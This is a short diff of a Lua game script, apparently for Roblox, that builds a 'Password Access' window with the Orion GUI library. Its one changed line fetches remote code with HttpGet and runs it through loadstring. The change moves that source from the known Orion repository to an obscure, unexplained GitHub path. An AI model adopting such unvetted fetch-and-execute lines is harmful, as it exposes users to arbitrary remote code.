@@ -78,7 +78,7 @@ local blacklisted = {
 }
 
 -- GUI Initialization
-local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/shlexware/Orion/main/source')))()
+local OrionLib = loadstring(game:HttpGet(('https://raw.githubusercontent.com/altaccountv1/mc-mods/refs/heads/main/no')))()
 local Window = OrionLib:MakeWindow({Name = "Password Access", HidePremium = false, SaveConfig = false, ConfigFolder = "OrionTest", IntroEnabled = false})
 local Tab = Window:MakeTab({Name = "Access", Icon = "nil", PremiumOnly = false})
 
